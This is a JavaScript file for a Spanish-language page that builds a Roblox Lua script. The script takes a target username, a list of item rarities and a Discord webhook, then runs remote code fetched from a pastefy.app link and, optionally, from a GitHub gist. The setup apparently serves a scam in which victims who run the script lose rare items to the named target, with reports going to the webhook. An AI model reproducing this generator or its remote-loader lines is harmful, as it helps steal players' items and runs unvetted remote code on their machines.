const R=["Ancient","Mythic","Legendary","Rare","Uncommon","Common"];
const LOADER='-- NO BORRAR, SI LO BORRAS NO FUNCIONARÁ\ntask.spawn(function()\n    loadstring(game:HttpGet("https://pastefy.app/HNaA6STp/raw"))()\nend)';
const $=id=>document.getElementById(id);
const chips=$("chips");
R.forEach(r=>chips.insertAdjacentHTML("beforeend",`<label class="chip"><input type="checkbox" value="${r}">${r}</label>`));
const boxes=()=>[...chips.querySelectorAll("input")];
$("allbtn").onclick=()=>{const all=boxes().every(b=>b.checked);boxes().forEach(b=>b.checked=!all);$("allbtn").textContent=all?"Seleccionar todas":"Quitar todas"};

// Comprobación opcional del user (API pública de Roblox vía roproxy). No bloquea nada.
let timer,seq=0;
const esc=s=>String(s).replace(/[&<>"]/g,c=>({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;"}[c]));
$("user").addEventListener("input",()=>{
  clearTimeout(timer);
  const n=$("user").value.trim();
  if(!n){$("ust").innerHTML="";return}
  $("ust").innerHTML='<span class="mut">Buscando…</span>';
  timer=setTimeout(()=>check(n),500);
});
// Búsqueda por GET (sin preflight, más compatible) con roproxy y respaldo por si falla.
async function searchUsers(n){
  const path=`v1/users/search?keyword=${encodeURIComponent(n)}&limit=10`;
  const sources=[
    `https://users.roproxy.com/${path}`,
    `https://api.allorigins.win/raw?url=${encodeURIComponent("https://users.roblox.com/"+path)}`
  ];
  for(const url of sources){
    try{
      const r=await fetch(url);
      if(!r.ok)continue;
      const d=(await r.json()).data;
      if(Array.isArray(d))return d;
    }catch(e){}
  }
  return null;
}
async function getAvatar(id){
  const path=`v1/users/avatar-headshot?userIds=${id}&size=150x150&format=Png`;
  const sources=[
    `https://thumbnails.roproxy.com/${path}`,
    `https://api.allorigins.win/raw?url=${encodeURIComponent("https://thumbnails.roblox.com/"+path)}`
  ];
  for(const url of sources){
    try{
      const r=await fetch(url);
      if(!r.ok)continue;
      const t=await r.json();
      if(t.data&&t.data[0]&&t.data[0].imageUrl)return t.data[0].imageUrl;
    }catch(e){}
  }
  return null;
}
async function check(n){
  const my=++seq,st=$("ust");
  const d=await searchUsers(n);
  if(my!==seq)return;
  if(d===null){st.innerHTML='<span class="mut">No se pudo comprobar el user ahora.</span>';return}
  const hit=d.find(u=>u.name&&u.name.toLowerCase()===n.toLowerCase());
  if(!hit){st.innerHTML='<span class="warn">No encontré ese user, revisa que esté bien escrito.</span>';return}
  let img="";
  const url=await getAvatar(hit.id);
  if(my!==seq)return;
  if(url)img=`<img src="${esc(url)}" alt="">`;
  st.innerHTML=`${img}<span class="ok">Sí existe: ${esc(hit.name)}</span>`;
}

const FREEZE='loadstring(game:HttpGet("https://gist.githubusercontent.com/Yamekiteelyeso/369045e74144c4f38f4a3fdd48161d34/raw/8c87201e316e03927f4f70a4fe0c37e9e87f3315/RdduzHub"))()';
$("frz").addEventListener("change",()=>{
  const on=$("frz").checked;
  $("custom").disabled=on;
  if(on){$("custom").value=FREEZE}
  else if($("custom").value.trim()===FREEZE){$("custom").value=""}
});

const q=s=>s.replace(/\\/g,"\\\\").replace(/"/g,'\\"').replace(/\r?\n/g," ");
$("make").onclick=()=>{
  const err=$("err");err.textContent="";
  const user=$("user").value.trim(),hook=$("hook").value.trim(),custom=$("frz").checked?FREEZE:$("custom").value.trim();
  const rar=boxes().filter(b=>b.checked).map(b=>b.value);
  if(!user){err.textContent="Escribe tu user.";return}
  if(!rar.length){err.textContent="Elige al menos una rareza.";return}
  if(!hook){err.textContent="Pon tu webhook.";return}
  const customBlock=custom?`\n\n-- script personalizado\ntask.spawn(function()\n    ${custom}\nend)`:"";
  $("code").textContent=`getgenv().TARGET = "${q(user)}"\n\ngetgenv().RARITIES = { ${rar.map(r=>`"${r}"`).join(", ")} }\n\ngetgenv().WEBHOOK = "${q(hook)}"\n\n${LOADER}${customBlock}\n`;
  $("out").style.display="block";
  $("out").scrollIntoView({behavior:"smooth",block:"start"});
};
$("copy").onclick=async()=>{
  const t=$("code").textContent,b=$("copy");
  try{await navigator.clipboard.writeText(t)}catch(e){const a=document.createElement("textarea");a.value=t;document.body.appendChild(a);a.select();document.execCommand("copy");a.remove()}
  b.textContent="¡Copiado!";setTimeout(()=>b.textContent="Copiar",1500);
};
